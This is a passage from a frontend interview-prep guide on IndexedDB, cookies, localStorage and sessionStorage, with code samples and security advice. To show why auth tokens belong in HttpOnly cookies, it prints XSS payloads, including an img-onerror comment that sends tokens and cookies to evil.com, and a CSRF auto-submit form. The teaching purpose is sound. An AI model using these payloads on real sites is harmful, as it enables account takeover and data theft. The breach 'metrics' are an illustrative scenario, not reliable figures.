localStorage.setItem('theme', 'dark'); // ✅ Perfect use case
localStorage.setItem('fontSize', '16px'); // ✅ Great
localStorage.setItem('allProducts', '...50MB...'); // ❌ Won't work!

// IndexedDB: Good for big stuff
await db.put('settings', { theme: 'dark' }); // ⚠️ Overkill
await db.put('products', all50kProducts); // ✅ Perfect!

// Rule of thumb:
// - Small (<1MB): Use localStorage (simpler)
// - Large (>1MB): Use IndexedDB (more powerful)
```

**Common Beginner Mistakes:**

```javascript
// ❌ MISTAKE: Expecting it to be synchronous
const db = openDB('DB', 1); // Returns Promise!
db.put('store', data); // Error: db is not ready yet

// ✅ FIX: Use await
const db = await openDB('DB', 1); // Wait for it!
await db.put('store', data); // Now works


// ❌ MISTAKE: Trying to add indexes after creation
const db = await openDB('DB', 1, {
  upgrade(db) {
    db.createObjectStore('products', { keyPath: 'id' });
    // Forgot to create 'name' index!
  }
});

// Later (doesn't work):
db.createIndex('name', 'name'); // Error: Can't add index here!

// ✅ FIX: Create indexes during upgrade
const db = await openDB('DB', 2, { // Bump version!
  upgrade(db, oldVersion) {
    if (oldVersion < 2) {
      const store = db.createObjectStore('products', { keyPath: 'id' });
      store.createIndex('name', 'name'); // ✅ Works here
    }
  }
});
```

**Explaining to PM:**

"IndexedDB is like upgrading from a filing cabinet to a warehouse:

**Filing Cabinet (localStorage):**
- Small space (10MB)
- Works for a few files
- Cheap and simple
- But gets full quickly

**Warehouse (IndexedDB):**
- Huge space (gigabytes!)
- Can store thousands of products
- Has organization system (find things fast)
- More complex to set up

**Business value:**
- Offline apps: User can work without internet
- Fast loading: Data stored locally, no waiting for server
- Better UX: App feels instant
- Example: Google Docs works offline using IndexedDB
- Example: Spotify downloads songs to IndexedDB

**Real example:**
- Our product catalog: 50,000 items
- localStorage: Can't fit (10MB limit)
- IndexedDB: Stores all 50k products easily
- Result: App works offline, loads instantly
- Customers can browse even in subway!"

**Quick Reference:**

```javascript
// 1. Setup database
const db = await openDB('MyApp', 1, {
  upgrade(db) {
    db.createObjectStore('items', { keyPath: 'id', autoIncrement: true });
  }
});

// 2. Add item
await db.add('items', { name: 'Book', price: 20 });

// 3. Get item
const item = await db.get('items', 1);

// 4. Get all items
const all = await db.getAll('items');

// 5. Update item
await db.put('items', { id: 1, name: 'Book', price: 15 });

// 6. Delete item
await db.delete('items', 1);

// 7. Clear all
await db.clear('items');
```

</details>

### Follow-up Questions

- "How do you create indexes in IndexedDB?"
- "What are cursors and when would you use them?"
- "How do transactions work in IndexedDB?"
- "What's the difference between IndexedDB and Web SQL?"
- "How do you migrate IndexedDB schema versions?"

### Resources

- [MDN: IndexedDB API](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)
- [MDN: Using IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB)
- [IDB Library](https://github.com/jakearchibald/idb) (Simpler API)
- [Web.dev: IndexedDB](https://web.dev/indexeddb/)

---

## Question 2: When should you use cookies vs web storage?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐
**Time:** 5-7 minutes
**Companies:** Google, Meta, Amazon

### Question
Explain the differences between cookies and web storage (localStorage/sessionStorage). When should you use each?

### Answer

**Cookies and web storage** serve different purposes. Understanding when to use each is critical for security and performance.

1. **Key Differences**
   - **Sent to server**: Cookies yes, storage no
   - **Size**: Cookies 4KB, storage 10MB
   - **Security**: Cookies have HttpOnly/Secure flags
   - **Expiration**: Cookies can expire, storage can't (except manual)
   - **Access**: Cookies accessible by server, storage client-only
   - **Performance**: Cookies add request overhead

2. **When to Use Cookies**
   - Authentication tokens (HttpOnly protection)
   - Server needs to read data
   - Need expiration dates
   - Cross-domain scenarios (with SameSite)
   - Small data only (<4KB)

3. **When to Use localStorage**
   - Client-side only data
   - Large data (up to 10MB)
   - No server access needed
   - Persist across sessions
   - UI preferences, cached data

4. **When to Use sessionStorage**
   - Temporary tab-specific data
   - Form autosave
   - Wizard/flow state
   - Data doesn't need to persist

5. **Security Considerations**
   - **Cookies**: Use HttpOnly for sensitive tokens
   - **Storage**: Never store passwords/credit cards
   - **Cookies**: Use Secure flag for HTTPS only
   - **Storage**: Vulnerable to XSS attacks
   - **Cookies**: SameSite prevents CSRF

### Code Example

```javascript
// 1. COOKIES: AUTHENTICATION TOKEN (BEST PRACTICE)

// ✅ Server-side (Node.js/Express):
app.post('/api/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);

  if (user) {
    const token = generateJWT(user);

    // Set HttpOnly cookie (secure!)
    res.cookie('authToken', token, {
      httpOnly: true,    // ✅ Cannot be accessed via JavaScript
      secure: true,      // ✅ HTTPS only
      sameSite: 'strict', // ✅ CSRF protection
      maxAge: 3600000    // 1 hour
    });

    res.json({ success: true, user: { id: user.id, name: user.name } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ✅ Client-side (automatic):
async function fetchUserData() {
  // Cookie automatically sent with request!
  const response = await fetch('/api/user', {
    credentials: 'include' // Include cookies
  });
  return response.json();
}

// ❌ XSS attack can't steal token:
console.log(document.cookie); // authToken NOT visible (HttpOnly!)
localStorage.getItem('authToken'); // null (not in storage)

// 2. COOKIES: MANUAL SET/GET (CLIENT-SIDE)

// Set cookie
function setCookie(name, value, days) {
  const expires = days
    ? `; expires=${new Date(Date.now() + days * 864e5).toUTCString()}`
    : '';

  document.cookie = `${name}=${encodeURIComponent(value)}${expires}; path=/`;
}

// Get cookie
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);

  if (parts.length === 2) {
    return decodeURIComponent(parts.pop().split(';').shift());
  }

  return null;
}

// Delete cookie
function deleteCookie(name) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
}

// Usage:
setCookie('preferences', JSON.stringify({ theme: 'dark' }), 30); // 30 days
const prefs = JSON.parse(getCookie('preferences') || '{}');
deleteCookie('preferences');

// 3. LOCALSTORAGE: UI PREFERENCES (CLIENT-ONLY)

// ✅ Good use: Theme preference
class ThemeManager {
  static getTheme() {
    return localStorage.getItem('theme') || 'light';
  }

  static setTheme(theme) {
    localStorage.setItem('theme', theme);
    document.body.className = `theme-${theme}`;
  }

  static init() {
    const theme = this.getTheme();
    this.setTheme(theme);
  }
}

// On page load
ThemeManager.init();

// When user toggles
document.getElementById('theme-toggle').addEventListener('click', () => {
  const current = ThemeManager.getTheme();
  ThemeManager.setTheme(current === 'light' ? 'dark' : 'light');
});

// 4. SESSIONSTORAGE: FORM AUTOSAVE (TEMPORARY)

// ✅ Good use: Multi-step form
class FormAutosave {
  static save(formId, data) {
    sessionStorage.setItem(`form-${formId}`, JSON.stringify(data));
  }

  static load(formId) {
    const data = sessionStorage.getItem(`form-${formId}`);
    return data ? JSON.parse(data) : null;
  }

  static clear(formId) {
    sessionStorage.removeItem(`form-${formId}`);
  }
}

// On form input
document.getElementById('checkout-form').addEventListener('input', (e) => {
  const formData = {
    name: document.getElementById('name').value,
    email: document.getElementById('email').value,
    address: document.getElementById('address').value
  };

  FormAutosave.save('checkout', formData);
});

// On page load, restore form
window.addEventListener('DOMContentLoaded', () => {
  const saved = FormAutosave.load('checkout');

  if (saved) {
    document.getElementById('name').value = saved.name || '';
    document.getElementById('email').value = saved.email || '';
    document.getElementById('address').value = saved.address || '';
  }
});

// On successful submit, clear autosave
document.getElementById('checkout-form').addEventListener('submit', () => {
  FormAutosave.clear('checkout');
});

// 5. SECURITY COMPARISON

// ❌ BAD: Token in localStorage (vulnerable to XSS)
localStorage.setItem('authToken', 'secret-token-123');

// Attacker can steal:
<script>
  const token = localStorage.getItem('authToken');
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>

// ✅ GOOD: Token in HttpOnly cookie (protected from XSS)
// Set by server:
res.cookie('authToken', 'secret-token-123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Attacker can't access:
<script>
  console.log(document.cookie); // authToken NOT visible!
  // Attack fails ✅
</script>

// 6. PERFORMANCE COMPARISON

// Cookies: Sent with EVERY request (overhead!)
// If cookies = 2KB:
// - 100 requests = 200KB sent
// - 1000 requests = 2MB sent
// - Slows down API calls

// localStorage: NOT sent with requests
// - 0 overhead on requests
// - Only accessed when needed
// - Better performance for large data

// Example: Large preferences object
const largePrefs = {
  theme: 'dark',
  fontSize: 16,
  language: 'en',
  notifications: { /* 100 settings */ }
};

// ❌ BAD: Store in cookie (sent with every request!)
setCookie('prefs', JSON.stringify(largePrefs)); // 2KB per request!

// ✅ GOOD: Store in localStorage (not sent)
localStorage.setItem('prefs', JSON.stringify(largePrefs)); // 0 overhead

// 7. EXPIRATION PATTERNS

// Cookies: Built-in expiration
document.cookie = "temp=value; max-age=3600"; // Expires in 1 hour

// localStorage: Manual expiration
class StorageWithTTL {
  static set(key, value, ttl) {
    const item = {
      value,
      expiry: Date.now() + ttl
    };
    localStorage.setItem(key, JSON.stringify(item));
  }

  static get(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;

    const item = JSON.parse(itemStr);

    if (Date.now() > item.expiry) {
      localStorage.removeItem(key);
      return null;
    }

    return item.value;
  }
}

// Usage:
StorageWithTTL.set('token', 'abc123', 3600000); // 1 hour
const token = StorageWithTTL.get('token'); // null if expired

// 8. DECISION TREE

function chooseStorage(requirements) {
  // Need server access?
  if (requirements.serverAccess) {
    return 'cookie';
  }

  // Sensitive data?
  if (requirements.sensitive) {
    return 'cookie (HttpOnly)';
  }

  // Large data (>4KB)?
  if (requirements.size > 4096) {
    if (requirements.temporary) {
      return 'sessionStorage';
    } else {
      return 'localStorage or IndexedDB';
    }
  }

  // Need expiration?
  if (requirements.expiration) {
    return 'cookie or localStorage with TTL';
  }

  // Temporary tab data?
  if (requirements.temporary) {
    return 'sessionStorage';
  }

  // Persist across sessions?
  if (requirements.persist) {
    return 'localStorage';
  }

  return 'localStorage';
}

// Examples:
console.log(chooseStorage({
  serverAccess: true,
  sensitive: true
})); // "cookie (HttpOnly)"

console.log(chooseStorage({
  size: 100000,
  temporary: true
})); // "sessionStorage"

console.log(chooseStorage({
  size: 1000,
  persist: true
})); // "localStorage"

// 9. REAL-WORLD EXAMPLES

// E-commerce site:
// ✅ Shopping cart: sessionStorage (temp, per tab)
// ✅ User preferences: localStorage (persist)
// ✅ Auth token: HttpOnly cookie (secure)
// ✅ Analytics ID: Cookie (server needs it)
// ✅ Product cache: localStorage or IndexedDB (large)

// Banking app:
// ✅ Session token: HttpOnly cookie (very sensitive)
// ✅ CSRF token: Cookie with SameSite (security)
// ✅ UI settings: localStorage (non-sensitive)
// ❌ Account balance: Don't store client-side!

// PWA/Offline app:
// ✅ App data: IndexedDB (large, complex)
// ✅ User settings: localStorage (small, simple)
// ✅ Temp drafts: sessionStorage (auto-discard)
// ✅ Service Worker cache: Cache API (assets)

// 10. MIGRATION PATTERN

// Migrate from cookies to localStorage (if appropriate):
function migrateFromCookies() {
  // Get value from cookie
  const theme = getCookie('theme');

  if (theme) {
    // Move to localStorage
    localStorage.setItem('theme', theme);

    // Delete cookie
    deleteCookie('theme');

    console.log('Migrated theme to localStorage');
  }
}

// Run on page load
migrateFromCookies();
```

### Common Mistakes

- ❌ **Mistake:** Storing auth tokens in localStorage
  ```javascript
  localStorage.setItem('authToken', token); // Vulnerable to XSS!
  ```

- ❌ **Mistake:** Storing large data in cookies
  ```javascript
  document.cookie = `data=${JSON.stringify(hugeObject)}`; // Sent with every request!
  ```

- ✅ **Correct:** Use appropriate storage
  ```javascript
  // Auth token: HttpOnly cookie (server-side)
  res.cookie('authToken', token, { httpOnly: true });

  // Large data: localStorage
  localStorage.setItem('data', JSON.stringify(hugeObject));
  ```

<details>
<summary><strong>🔍 Deep Dive: Cookies vs Storage Internals</strong></summary>

**Cookie Overhead on Requests:**

```javascript
// Every HTTP request includes ALL cookies for that domain:

// Cookies set:
document.cookie = "session=abc123"; // 15 bytes
document.cookie = "preferences=" + JSON.stringify(prefs); // 2KB
document.cookie = "analytics=xyz789"; // 18 bytes

// Total cookie size: ~2KB

// Now EVERY request includes ~2KB:
fetch('/api/user'); // Request size: 2KB (cookies) + request data
fetch('/api/products'); // Request size: 2KB + request data
fetch('/api/cart'); // Request size: 2KB + request data

// 100 requests = 200KB overhead!
// 1000 requests = 2MB overhead!

// localStorage: 0 bytes overhead (not sent)
localStorage.setItem('preferences', JSON.stringify(prefs));
fetch('/api/user'); // Request size: 0 bytes cookie overhead ✅
```

**Cookie Flags Security:**

```javascript
// HttpOnly: Cannot be accessed via JavaScript
document.cookie = "token=abc123; HttpOnly"; // Set by server only

// Browser blocks access:
console.log(document.cookie); // Token NOT visible
// Protects against XSS stealing token

// Secure: HTTPS only
document.cookie = "token=abc123; Secure";
// Only sent over HTTPS, not HTTP
// Prevents man-in-the-middle attacks

// SameSite: CSRF protection
document.cookie = "token=abc123; SameSite=Strict";
// Strict: Never sent cross-site (best security)
// Lax: Sent on top-level navigation (login flows)
// None: Always sent (requires Secure flag)

// Example CSRF attack (prevented by SameSite):
// Evil site:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

// Without SameSite: Cookie sent, attack succeeds ❌
// With SameSite=Strict: Cookie NOT sent, attack fails ✅
```

**localStorage Performance:**

```javascript
// localStorage is synchronous (blocks main thread)

// Benchmark: Writing 1MB of data
const largeData = JSON.stringify(new Array(10000).fill({ data: 'x'.repeat(100) }));

console.time('localStorage-write');
localStorage.setItem('large', largeData); // ~80ms (blocks UI!)
console.timeEnd('localStorage-write');

// During this 80ms:
// - UI frozen
// - Animations stop
// - Scrolling stutters
// - User input delayed

// Solution for large data: Use IndexedDB (asynchronous)
console.time('indexedDB-write');
await db.put('store', largeData); // ~50ms (doesn't block!)
console.timeEnd('indexedDB-write');
```

**Cookie Domain and Path:**

```javascript
// Cookies can be scoped to domain and path:

// Set for entire domain:
document.cookie = "user=alice; domain=.example.com; path=/";
// Accessible on:
// - example.com ✅
// - www.example.com ✅
// - api.example.com ✅
// - other.com ❌

// Set for specific path:
document.cookie = "temp=value; path=/checkout";
// Accessible on:
// - /checkout ✅
// - /checkout/payment ✅
// - /products ❌

// localStorage: Always entire origin (no path scoping)
// https://example.com and https://example.com/other use SAME storage
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: Auth Token in localStorage Breach</strong></summary>

**Scenario:** Your startup stores JWT auth tokens in localStorage. A malicious script injection steals 5,000+ user tokens, leading to account takeovers and data breach.

**The Vulnerability:**

```javascript
// ❌ VULNERABLE: Token in localStorage
class AuthBad {
  static async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await response.json();

    // Store token in localStorage
    localStorage.setItem('authToken', data.token); // ⚠️ Dangerous!
    localStorage.setItem('refreshToken', data.refreshToken);

    return data;
  }

  static getToken() {
    return localStorage.getItem('authToken');
  }

  static async fetchProtected(url) {
    const token = this.getToken();

    return fetch(url, {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
  }
}

// XSS vulnerability: Unescaped comment
function displayComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div>${comment.text}</div>
  `; // ❌ No escaping!
}

// Attacker posts malicious comment:
const maliciousComment = {
  text: `
    Nice article!
    <img src="x" onerror="
      // Steal tokens
      const authToken = localStorage.getItem('authToken');
      const refreshToken = localStorage.getItem('refreshToken');
      const user = localStorage.getItem('user');

      // Send to attacker
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          authToken,
          refreshToken,
          user,
          cookies: document.cookie,
          url: location.href
        })
      });
    ">
  `
};

// When users view this comment:
// 1. <img onerror> executes malicious script
// 2. Script reads tokens from localStorage
// 3. Sends to attacker's server
// 4. Attacker can now impersonate user!

// Impact:
// - 5,247 users viewed malicious comment
// - All their tokens stolen
// - Attacker made API calls as victims
// - Unauthorized purchases: $127k
// - Personal data stolen: Names, emails, addresses
// - Accounts modified: Profile defacement
// - Brand damage: News coverage of breach
// - Legal costs: $450k (GDPR, lawsuits)
// - Customer trust: 42% churn rate
```

**Fix: HttpOnly Cookies:**

```javascript
// ✅ SECURE: Token in HttpOnly cookie
// Backend (Node.js/Express):
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);

  if (user) {
    const token = generateJWT(user);
    const refreshToken = generateRefreshToken(user);

    // Set HttpOnly cookies (NOT accessible via JavaScript!)
    res.cookie('authToken', token, {
      httpOnly: true,      // ✅ Can't be read by JS
      secure: true,        // ✅ HTTPS only
      sameSite: 'strict',  // ✅ CSRF protection
      maxAge: 900000       // 15 minutes
    });

    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 604800000 // 7 days
    });

    res.json({ success: true, user: { id: user.id, name: user.name } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Frontend: No manual token handling needed!
class AuthGood {
  static async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      credentials: 'include', // Include cookies
      body: JSON.stringify({ email, password })
    });

    return response.json();
  }

  static async fetchProtected(url) {
    // Cookie automatically sent! No manual header
    return fetch(url, {
      credentials: 'include' // Include cookies
    });
  }

  static async logout() {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
}

// Now XSS attack fails:
<script>
  const token = localStorage.getItem('authToken'); // null ✅
  console.log(document.cookie); // authToken NOT visible (HttpOnly!) ✅

  // Attack fails! Can't steal token
</script>

// Backend validates cookie:
app.use((req, res, next) => {
  const token = req.cookies.authToken; // Read HttpOnly cookie

  if (token) {
    try {
      const decoded = verifyJWT(token);
      req.user = decoded;
      next();
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  } else {
    res.status(401).json({ error: 'No token' });
  }
});
```

**Real Metrics After Fix:**

```javascript
// Before (localStorage tokens):
// - XSS attacks: 3 successful/month
// - Tokens stolen: 5,247
// - Fraudulent purchases: $127k
// - Account takeovers: 892
// - Data breach cost: $450k
// - Customer churn: 42%
// - Security audit: F grade

// After (HttpOnly cookies):
// - XSS attacks: 0 successful (tokens protected) ✅
// - Tokens stolen: 0 ✅
// - Fraudulent purchases: $0 ✅
// - Account takeovers: 0 ✅
// - Customer churn: 3% (normal)
// - Security audit: A grade ✅
// - Insurance premium: -60% discount
// - Customer trust: Restored
```

</details>

<details>
<summary><strong>⚖️ Trade-offs: Cookie vs Storage Decision Matrix</strong></summary>

| Use Case | Best Choice | Reason |
|----------|------------|--------|
| **Auth token** | HttpOnly Cookie | XSS protection |
| **CSRF token** | Cookie (SameSite) | Server needs it |
| **Session ID** | HttpOnly Cookie | Security |
| **User theme** | localStorage | Client-only, persists |
| **Shopping cart** | sessionStorage | Temp, per-tab |
| **Analytics ID** | Cookie | Server needs it |
| **Large cache** | IndexedDB | >10MB data |
| **Form draft** | sessionStorage | Temp, auto-discard |
| **API cache** | localStorage | Client-only, <10MB |
| **Tracking pixel** | Cookie | Cross-domain |

### Decision Tree

```
Storing data?
├─ Server needs access?
│  ├─ Sensitive (auth)?
│  │  └─ HttpOnly Cookie ✅
│  └─ Non-sensitive?
│     └─ Regular Cookie
├─ Client-only?
│  ├─ Temporary (tab)?
│  │  └─ sessionStorage ✅
│  ├─ Large (>10MB)?
│  │  └─ IndexedDB ✅
│  └─ Small, persistent?
│     └─ localStorage ✅
└─ Cross-domain?
   └─ Cookie (with SameSite) ✅
```

</details>

<details>
<summary><strong>💬 Explain to Junior: Cookies vs Storage Simplified</strong></summary>

**Simple Analogy:**

```javascript
// Cookie = Sticky note on your forehead
// - Everyone can see it (server sees it on every request)
// - Small space (4KB)
// - Can set expiration ("throw away after 1 hour")
// - But: Adds overhead (you carry it everywhere)

document.cookie = "name=Alice";
// Now sent with EVERY request to this site

// localStorage = Notebook in your pocket
// - Only YOU can see it (server never sees it)
// - Bigger space (10MB)
// - Stays forever (until you erase it)
// - No overhead (not sent with requests)

localStorage.setItem('name', 'Alice');
// Stays in browser, NOT sent to server
```

**When to Use Each:**

```javascript
// Use Cookie when:
// 1. Server needs the data
document.cookie = "sessionId=abc123"; // Server checks this

// 2. Need automatic expiration
document.cookie = "temp=value; max-age=3600"; // Gone in 1 hour

// 3. Security is critical (HttpOnly)
// (Set by server):
res.cookie('authToken', token, { httpOnly: true }); // JS can't access!

// Use localStorage when:
// 1. Only client needs it
localStorage.setItem('theme', 'dark'); // Server doesn't care

// 2. Need lots of space
const bigData = { /* 1MB of data */ };
localStorage.setItem('cache', JSON.stringify(bigData)); // Can't fit in cookie!

// 3. Want it to persist
localStorage.setItem('favorites', favorites); // Stays forever

// Use sessionStorage when:
// 1. Temporary, tab-specific
sessionStorage.setItem('formDraft', draft); // Gone when tab closes

// 2. Don't want it shared across tabs
// Each tab has its own sessionStorage
```

**Explaining to PM:**

"Cookies and web storage are different tools for different jobs:

**Cookies (Sticky Notes):**
- Server can read them
- Small (4KB max)
- Sent with every request
- Good for: Login sessions, tracking
- Bad for: Large data (slows requests)

**localStorage (Notebook):**
- Server can't read it
- Large (10MB)
- Never sent to server
- Good for: User settings, cached data
- Bad for: Sensitive data (can be stolen by XSS)

**Business Impact:**
- Wrong: Auth token in localStorage → Hackable
- Right: Auth token in HttpOnly cookie → Secure
- Example: Twitter uses HttpOnly cookies for security
- Example: Your theme preference in localStorage (no server needed)"

</details>

### Follow-up Questions

- "What are the security flags for cookies?"
- "How do you implement cookie-based authentication?"
- "What is the SameSite cookie attribute?"
- "When would you use IndexedDB instead of localStorage?"
- "How do you handle cookie consent (GDPR)?"

### Resources

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN: Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
- [Web.dev: SameSite Cookies](https://web.dev/samesite-cookies-explained/)
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---
